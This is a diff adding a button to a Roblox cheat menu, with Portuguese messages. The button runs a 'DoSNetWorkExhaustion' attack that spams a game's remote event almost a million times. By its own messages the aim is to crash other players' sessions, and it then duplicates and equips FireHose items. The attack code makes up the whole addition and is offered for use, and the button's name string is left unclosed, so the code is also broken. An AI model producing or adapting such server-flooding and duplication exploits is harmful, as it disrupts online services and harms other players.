@@ -667,6 +667,87 @@ if LocalPlayer.UserId == ID_DONO then
     })
 end
 
+MainTab:CreateButton({
+        Name = ";DoSNetWorkExhaustion
+        Callback = function()
+            local player = game:GetService("Players").LocalPlayer
+            if not player then return end
+            local replicatedStorage = game:GetService("ReplicatedStorage")
+            local starterGui = game:GetService("StarterGui")
+
+            local character = player.Character or player.CharacterAdded:Wait()
+            local rootpart = character:WaitForChild("HumanoidRootPart", 10)
+            if not rootpart then 
+                pcall(function() starterGui:SetCore("SendNotification", { Title = "Erro", Text = "HumanoidRootPart não encontrado.", Button1 = "Ok", Duration = 5 }) end)
+                return 
+            end
+            local oldcf = rootpart.CFrame
+
+            local re = replicatedStorage:FindFirstChild("RE")
+            local toolRemote = re and re:FindFirstChild("1Too1l")
+
+            if not toolRemote then 
+                pcall(function() starterGui:SetCore("SendNotification", { Title = "Erro", Text = "Remote funcional não encontrado.", Button1 = "Ok", Duration = 5 }) end)
+                return 
+            end
+
+            pcall(function() starterGui:SetCore("SendNotification", { Title = "Ataque DoS Iniciado", Text = "Aguarde os jogadores Crashar", Button1 = "Ok", Duration = 5 }) end)
+
+            task.spawn(function()
+                for m = 1, 999999 do
+                    task.spawn(function()
+                        if toolRemote:IsA("RemoteFunction") then
+                            toolRemote:InvokeServer("PickingTools", "FireHose")
+                        else
+                            toolRemote:FireServer("PickingTools", "FireHose")
+                        end
+                    end)
+
+                    local backpack = player:FindFirstChild("Backpack")
+                    if backpack then
+                        local fireHose = backpack:FindFirstChild("FireHose")
+                        if fireHose and fireHose:FindFirstChild("ToolSound") then
+                            fireHose.ToolSound:FireServer("FireHose", "DestroyFireHose")
+                        end
+                    end
+                    if m % 15 == 0 then task.wait(0.1) end
+                end
+            end)
+
+            task.wait(0.4)
+            player.CharacterRemoving:Wait()
+            local newCharacter = player.CharacterAdded:Wait()
+            local newRootPart = newCharacter:WaitForChild("HumanoidRootPart", 15)
+            local humanoid = newCharacter:WaitForChild("Humanoid", 15)
+
+            if newRootPart and humanoid then
+                task.wait(0.7)
+                humanoid:ChangeState(Enum.HumanoidStateType.Physics)
+                newRootPart.CFrame = oldcf
+                newRootPart.AssemblyLinearVelocity = Vector3.new(0, 0, 0)
+            end
+
+            pcall(function() starterGui:SetCore("SendNotification", { Title = "Script de Dupe", Text = "Concluído, Equipando Itens...", Button1 = "Ok", Duration = 5 }) end)
+            task.wait(0.5)
+
+            local backpack = player:WaitForChild("Backpack", 10)
+            if backpack then
+                local items = backpack:GetChildren()
+                local equipCount = 0
+                for i = 1, #items do
+                    local item = items[i]
+                    if item:IsA("Tool") and item.Name == "FireHose" then
+                        equipCount = equipCount + 1
+                        task.defer(function() item.Parent = newCharacter end)
+                        if equipCount % 8 == 0 then task.wait(0.02) end 
+                    end
+                end
+            end
+            task.wait(0.5)
+            pcall(function() starterGui:SetCore("SendNotification", { Title = "Script de Dupe", Text = "Finalizando processo...", Button1 = "Ok", Duration = 5 }) end)
+        end,
+    })
+
 -- Substitua MainTab pelo nome da sua aba ou crie uma nova apenas para Status
 local SectionStatus = MainTab:CreateSection("Monitoramento do Servidor & Lag")
 
